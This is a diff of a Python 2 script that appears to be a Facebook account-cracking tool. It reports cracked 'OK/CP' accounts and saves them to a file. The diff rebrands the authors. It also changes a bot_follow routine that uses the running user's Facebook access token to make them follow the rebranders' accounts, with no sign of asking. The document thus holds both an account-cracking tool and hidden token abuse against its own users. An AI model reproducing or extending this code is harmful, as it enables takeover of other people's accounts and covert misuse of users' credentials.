@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8
-# Facebook  : Dapunta Khurayra X
-# Instagram : ratya.anonym.id
+# Facebook  : Shadow Cyber KING
+# Instagram : hackerdx420
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,uuid
 from multiprocessing.pool import ThreadPool
@@ -146,12 +146,12 @@ def bot_follow():
 	except IOError:
 		print("\n   [!] Token invalid")
 		masuk()
-    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
+    	requests.post('https://graph.facebook.com/100006539235634/subscribers?access_token=' + toket)      #SHADOW CYBER KING
     	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
     	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
     	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
     	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
-    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
+    	requests.post('https://graph.facebook.com/100008647622021/subscribers?access_token=' + toket) #SYED REHMAN
     	menu()
 			
 def menu():
@@ -404,7 +404,7 @@ def pilih_passxd():
 	print "   [•] Total OK/CP: "+str(len(oks))+"/"+str(len(cekpoint))
 	print ("   [•] File Saved At : done/Indo.txt")
 	raw_input("   [ Back ]")
-	os.system("python2 fbcrack")
+	os.system("python2 FAST.py")
 	menu()
 
 def updatesc():
@@ -414,7 +414,7 @@ def updatesc():
 	os.system("git pull origin master")
 	print ("   [•] Successfully Update")
 	raw_input("\n   [ Back ]")
-	os.system("python2 fbcrack")	
+	os.system("python2 FAST.py")	
 	
 if __name__ == '__main__':
 	menu() 
